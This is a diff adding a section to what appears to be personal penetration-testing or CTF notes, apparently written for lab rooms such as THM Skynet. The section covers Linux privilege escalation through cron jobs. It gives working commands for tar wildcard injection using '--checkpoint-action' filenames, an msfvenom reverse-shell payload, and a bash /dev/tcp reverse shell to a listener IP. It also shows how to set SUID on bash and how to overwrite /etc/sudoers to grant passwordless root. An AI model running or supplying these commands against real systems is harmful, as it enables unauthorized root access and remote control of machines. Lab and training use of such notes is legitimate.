@@ -19,6 +19,65 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
 [Security Online](https://securityonline.info/icmpsh-simple-reverse-icmp-shell/)
 
+# CronJobs - File Permissions 
+```bash
+cat /etc/crontab
+# IF CronJobs runs a <file>.sh script, edit <file>.sh to establish a reverse shell.
+```
+
+# CronJobs - Wildcard
+```bash
+cat /etc/crontab
+# Find CronJobs using wildcards.
+# Search GTFObins for CronJob command.
+
+# Find out the time to see when the next job will run.
+date
+
+### NOTE - I had problems making the scripts executable and callng them.
+### Using exec=sh <script>.sh worked, when the others did not.
+### See notes from THM Skynet room.
+### I was unable to establish a reverse shell.
+### Scripts that I chmod +x did not execute.
+### Calling he scripts with sh worked.
+echo "" > "--checkpoint-action=exec=sh <script>.sh"
+
+# Example using tar.
+# Create reverse shell binary with msfvenom.
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<local IP> LPORT=<port num> -f elf -o shell.elf
+# Copy shell.elf to server.
+# Make shell.elf executable, on server.
+chmod +x /home/user/shell.elf
+# Start listener.
+nc -nvlp <port num>
+# Create these two files in /home/user:
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+# These filenames will be read as tar arguments, causing tar to execute shell.elf.
+
+## ALTERNATIVES
+# Use a bash shell.
+echo "bash -i >& /dev/tcp/10.13.25.242/9999 0>&1" > shell.sh
+chmod +x shell.sh
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.sh
+# Make /bin/bash a SUID.
+printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
+chmod +x shell.sh
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.sh
+# Copy /bin/bash to a /tmp and make SUID.
+printf '#!/bin/bash\ncp /bin/bash /tmp/newbinbash && chmod +s /tmp/newbinbash' > newbinbash.sh
+chmod +x newbinbash.sh
+touch /var/www/html/--checkpoint=1
+touch /var/www/html/--checkpoint-action=exec=newbinbash.sh
+# Make the current user a sudoer.
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+chmod +x privesc.sh
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=privesc.sh
+```
+
 # [Upgrade a linux reverse shell to a fully usable TTY shell](https://zweilosec.github.io/posts/upgrade-linux-shell/)
 ##### Note: The methods above will not work in every situation. For example, I have regularly run into a problem on my Kali machine where attempting to use stty raw -echo while using zsh as my shell will cause the entire terminal to become unusable. I have gotten around this issue by switching to bash before I start any netcat listener that I will be using to catch a shell.
 ```bash
